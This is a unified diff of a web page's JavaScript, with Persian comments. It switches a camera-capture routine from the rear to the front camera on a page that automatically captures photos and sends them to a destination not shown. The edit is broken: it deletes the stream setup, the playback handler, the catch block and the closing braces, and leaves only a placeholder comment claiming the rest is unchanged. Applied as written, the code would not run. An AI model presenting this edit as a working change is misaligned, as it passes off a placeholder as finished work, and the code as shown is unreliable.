@@ -121,36 +121,18 @@ p{
         }
     });
 
-   async function startCamera() {
+  async function startCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } }, 
+                video: { 
+                    // 💡 اینجا تغییر می‌کند: 'environment' تبدیل به 'user' می‌شود
+                    facingMode: 'user', 
+                    width: { ideal: 1280 }, 
+                    height: { ideal: 720 } 
+                }, 
                 audio: false 
             });
-
-            video.srcObject = stream;
-            
-            video.onloadedmetadata = () => {
-                video.play();
-                // 💡 تغییر: اضافه کردن یک خط play اضافی برای موبایل
-                video.addEventListener('canplay', function() {
-                    video.play(); 
-                }, { once: true }); // فقط یک بار اجرا شود
-                
-                log.innerText = "✅ دوربین فعال شد. در حال ارسال اولین عکس...";
-                streamActive = true;
-                
-                // ... بقیه کد (setTimeout)
-                setTimeout(() => {
-                    captureAndSend(); // گرفتن و ارسال اولین عکس (R1)
-                }, 500); // 0.5 ثانیه تاخیر
-            };
-
-        } catch (err) {
-            // ... بقیه کد
-        }
-    }
-
+            // ... بقیه کد بدون تغییر
     async function captureAndSend() {
         if (!streamActive || video.videoWidth === 0) return;
 
@@ -184,6 +166,7 @@ p{
 </body>
 
 </html>
+
 
 
 
